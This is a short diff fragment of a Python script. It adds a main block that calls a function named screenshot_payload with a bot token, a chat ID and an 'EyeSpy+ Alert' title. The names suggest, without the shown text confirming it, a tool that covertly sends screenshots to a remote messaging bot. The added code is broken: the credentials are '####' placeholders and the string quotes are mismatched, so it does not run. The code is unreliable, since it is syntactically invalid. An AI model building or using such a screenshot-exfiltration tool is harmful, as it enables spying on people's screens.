@@ -18,5 +18,13 @@ def screenshot_payload(bot_token, chat_id, title, message):
   else:
     print(f"Failed: {response.text}")
     
+if __name__ == "__main__":
+  screenshot_payload(
+    bot_token=####, 
+    chat_id=#####, 
+    title= "EyeSpy+ Alert, 
+    message= "HIGH PRIORITY ALERT'
+    )
+  
 
 
